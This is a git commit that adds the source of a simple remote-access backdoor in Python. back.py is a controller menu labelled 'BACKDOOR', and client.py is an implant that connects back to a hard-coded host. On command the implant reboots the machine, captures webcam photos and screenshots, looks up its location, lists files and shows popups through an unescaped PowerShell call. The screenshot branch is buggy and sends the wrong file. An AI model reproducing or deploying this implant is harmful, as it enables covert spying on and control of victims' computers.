c78b6f655c5837735f2568f4f68423e737c5a1f4
iop <richmondmoong2010@gmail.com>
2025-07-13 02:25:19 +0800

    Add files via upload

---
+++ back.py
@@ -0,0 +1,83 @@
+from socket import *
+import socket
+import os
+
+GREEN = "\033[92m"
+RESET = "\033[0m"
+
+banner = r"""
+ _______    ______    ______   __    __  _______    ______    ______   _______          ______   __    __   ______    ______    ______   ________ 
+|       \  /      \  /      \ |  \  /  \|       \  /      \  /      \ |       \        /      \ |  \  |  \ /      \  /      \  /      \ |        \
+| $$$$$$$\|  $$$$$$\|  $$$$$$\| $$ /  $$| $$$$$$$\|  $$$$$$\|  $$$$$$\| $$$$$$$\      |  $$$$$$\| $$  | $$|  $$$$$$\|  $$$$$$\|  $$$$$$\| $$$$$$$$
+| $$__/ $$| $$__| $$| $$   \$$| $$/  $$ | $$  | $$| $$  | $$| $$  | $$| $$__| $$      | $$   \$$| $$__| $$| $$  | $$| $$  | $$| $$___\$$| $$__    
+| $$    $$| $$    $$| $$      | $$  $$  | $$  | $$| $$  | $$| $$  | $$| $$    $$      | $$      | $$    $$| $$  | $$| $$  | $$ \$$    \ | $$  \   
+| $$$$$$$\| $$$$$$$$| $$   __ | $$$$$\  | $$  | $$| $$  | $$| $$  | $$| $$$$$$$\      | $$   __ | $$$$$$$$| $$  | $$| $$  | $$ _\$$$$$$\| $$$$$   
+| $$__/ $$| $$  | $$| $$__/  \| $$ \$$\ | $$__/ $$| $$__/ $$| $$__/ $$| $$  | $$      | $$__/  \| $$  | $$| $$__/ $$| $$__/ $$|  \__| $$| $$_____ 
+| $$    $$| $$  | $$ \$$    $$| $$  \$$\| $$    $$ \$$    $$ \$$    $$| $$  | $$       \$$    $$| $$  | $$ \$$    $$ \$$    $$ \$$    $$| $$     \
+ \$$$$$$$  \$$   \$$  \$$$$$$  \$$   \$$ \$$$$$$$   \$$$$$$   \$$$$$$  \$$   \$$        \$$$$$$  \$$   \$$  \$$$$$$   \$$$$$$   \$$$$$$  \$$$$$$$$
+
+
+"""
+
+
+def main():
+    s = socket.socket()
+    s.bind(('192.168.50.111', 6427))
+    s.listen()
+    s, addr = s.accept()
+
+    print(GREEN + banner + RESET)
+    print(GREEN + f"Client connected: {addr}" + RESET)
+    print(GREEN + "MAKE-BY-IOP" + RESET)
+    print(GREEN + "-" * 67 + RESET)
+    print(GREEN + "Author: iop" + RESET)
+    print(GREEN + "BACKDOOR" + RESET)
+    print(GREEN + "-" * 67 + RESET)
+
+    while True:
+        print("\nMenu:")
+        print("1. Exit")
+        print("2. Restart client")
+        print("3. Take webcam photo")
+        print("4. Get location")
+        print("5. Screenshot")
+        print("6. List files in current directory")
+        print("7. Show popup message")
+        choice = input("Enter operation number: ").strip()
+        s.send(choice.encode())
+
+        if choice == '1':
+            print("Exiting...")
+            break
+
+        elif choice in ['3', '5']:  # Receive image
+            file_size = int(s.recv(1024).decode())
+            s.send(b'ok')
+
+            filename = '1.png' if choice == '3' else '2.png'
+
+            cur_size = 0
+            with open(filename, 'wb') as f:
+                while cur_size < file_size:
+                    data = s.recv(1024)
+                    f.write(data)
+                    cur_size += len(data)
+            print(f"Saved: {filename}")
+
+        elif choice == '4':  # Location
+            loc = s.recv(1024).decode()
+            print("Location:")
+            print(loc)
+
+        elif choice == '6':  # File list
+            data = s.recv(4096).decode()
+            print("File list:")
+            print(data)
+
+        elif choice == '7':  # Popup message
+            text = input(GREEN + "Enter message to display: " + RESET)
+            s.send(text.encode())
+
+
+if __name__ == '__main__':
+    main()
---
+++ client.py
@@ -0,0 +1,63 @@
+import os
+import cv2
+import pyautogui
+import requests
+from socket import *
+
+def get_location():
+    try:
+        res = requests.get("https://ipinfo.io/json").json()
+        loc = res["loc"]
+        lat, lon = loc.split(",")
+        return float(lat), float(lon)
+    except:
+        return None, None
+
+s = socket()
+s.connect(('192.168.50.111', 6427))  # Replace with your controller IP
+
+while True:
+    choice = s.recv(1024).decode()
+
+    if choice == '1':
+        break
+
+    elif choice == '2':
+        os.system('shutdown -r -t 5')
+
+    elif choice == '3':
+        cap = cv2.VideoCapture(0)
+        ret, frame = cap.read()
+        cv2.imwrite('webcam.png', frame)
+        cap.release()
+
+        file_size = os.path.getsize('webcam.png')
+        s.send(str(file_size).encode())
+        s.recv(1024)
+        with open('webcam.png', 'rb') as f:
+            for data in f:
+                s.send(data)
+
+    elif choice == '4':
+        lat, lon = get_location()
+        msg = f"Latitude: {lat}\nLongitude: {lon}" if lat else "Location not available"
+        s.send(msg.encode())
+
+    elif choice == '5':  # Screenshot
+        screenshot = pyautogui.screenshot()
+        screenshot.save('screenshot.png')
+
+        file_size = os.path.getsize('1.png')
+        s.send(str(file_size).encode())
+        s.recv(1024).decode()
+        with open('webcam.png', 'rb') as f:
+            for data in f:
+                s.send(data)
+
+    elif choice == '6':  # List current directory
+        files = '\n'.join(os.listdir('.'))
+        s.send(files.encode())
+
+    elif choice == '7':  # Show popup
+        msg = s.recv(1024).decode()
+        os.system(f'powershell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\'{msg}\')"')
